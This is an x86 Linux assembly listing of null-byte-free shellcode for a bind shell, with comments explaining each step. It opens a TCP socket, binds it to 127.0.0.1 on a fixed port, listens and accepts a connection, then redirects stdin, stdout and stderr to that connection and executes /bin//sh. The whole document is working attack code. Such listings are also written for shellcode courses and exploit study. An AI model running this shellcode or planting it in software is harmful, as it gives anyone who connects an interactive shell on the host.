global _start

section .text

_start:

socket:

xor eax,eax
push eax ;protocol
inc eax
push eax ;SOCK_STREAM
inc eax
push eax ;AF_INET

mov al, 0x66 ;sys_socketcall
mov ebx, [esp+4] ; socket(AF_INET, SOCK_STREAM, 0)
mov ecx, esp ; socket args
int 0x80

; file descriptor now in eax

bind:

;set up sockaddr_in struct
;sin_zero = is 8 bytes trash, so existing stack data can be used
;http://beej.us/guide/bgnet/output/html/multipage/sockaddr_inman.html

;sin_add.s_addr localhost constant
;avoiding nullbytes
;push 0x0100007f <-- not doable then
;ebx is 0x1 from before, shift it into correct position
shl ebx, 0x18
mov bl, 0x7f ;enter last part
push ebx
xor ebx,ebx ;zero out ebx

;AF_INET (0002) and sin_port ffff
;push 0xcdab0002 <-- zero bytes
mov cx, 0xcdab ; port number
shl ecx, 0x10
mov cl, 0x2 ; <-- AF_INET
push ecx

;setup arguments
mov [esp-8],esp ;load the sockaddr struct address  on the stack at correct offset

push 0x10 ; size of sockaddr_in is 16 bytes

sub esp,0x4 ; correct the stack offset because of preload of sockaddr_in struct

push eax ; file descriptor

mov al, 0x66 ;sys_socketcall
mov bl, 0x2 ; bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
mov ecx, esp ;arguments
int 0x80

listen:

mov dword [esp+4], eax ;backlog argument should be 0, use success return value (0) from bind

;esp points towards file descriptor from before, so no need to set the argument

mov al, 0x66 ;sys_socketcall
mov bl, 0x4 ; listen(int sockfd, int backlog);
mov ecx, esp ;arguments
int 0x80

accept:
push 0x10 ;addrlen
push esp ; address of it
lea ecx, [esp+0x10] ; address to sockaddr struct
push ecx ;push it as it is an argument
push dword [esp+0xC] ; sockfd

mov al, 0x66 ;sys_socketcall
mov bl, 0x5 ; accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
mov ecx, esp ;arguments
int 0x80

dup2:
xor ecx, ecx
xchg ebx, eax ;set accept fd as argument in ebx
              ;and making sure eax<=0xFF for the eax  part below (so that it only equals 0x3f below).

jump:

mov al, 0x3f ; dup2 sys call
int 0x80 ;int dup2(int oldfd, int newfd);
inc ecx ;
cmp ecx,0x2 ; call dup for stdin,stdout,stderr
jle jump

execve:
xor eax,eax
push dword [esp-8] ; referencing null being pushed below
push eax ;ends /bin//sh with null and argv and envp as null arguments

mov edx, esp; envp
mov ecx, esp ; argv
push 0x68732f2f;//sh
push 0x6e69622f;/bin
mov ebx, esp
mov al, 0xb ;; execve(const char *filename, char *const argv[],char *const envp[]);
int 0x80

